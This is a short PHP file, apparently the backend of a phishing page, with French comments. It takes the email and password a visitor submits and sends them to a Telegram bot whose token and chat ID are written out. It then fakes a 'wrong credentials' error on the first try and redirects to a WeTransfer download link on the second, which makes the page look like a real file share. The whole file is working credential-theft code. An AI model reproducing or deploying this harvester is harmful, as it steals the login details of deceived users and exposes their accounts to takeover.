<?php
// send_to_telegram.php

// Récupération des données JSON
$data = json_decode(file_get_contents('php://input'), true);
$email = $data['email'];
$password = $data['password'];

// Envoyer les informations à Telegram
$botToken = "8468859035:AAENMfI8elGv93d81eUxNMPUhrGrdWQiTmw"; // Remplacez par votre token de bot Telegram
$chatId = "8073815184"; // Remplacez par votre ID de chat Telegram
$message = "Identifiants:\nEmail: $email\nMot de passe: $password";

// Envoi du message à Telegram
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

// Vérification des tentatives
if (!isset($_COOKIE['attempts'])) {
    // Première tentative, envoyer les informations à Telegram
    setcookie('attempts', 1, time() + 3600); // Créer un cookie pour la première tentative
    echo json_encode(['success' => false, 'error' => 'Identifiants incorrects. Veuillez réessayer.']);
} else {
    // Deuxième tentative, rediriger vers Google
    setcookie('attempts', '', time() - 3600); // Supprimer le cookie d'essai
    echo json_encode(['success' => true, 'redirect' => 'https://wetransfer.com/downloads/b8ff301ed372d7eaf72a78a282b1480c20260311233016/2f43f1c964bb2f1587d13a6b71601d7520260311233052/160d46']);
}
?>
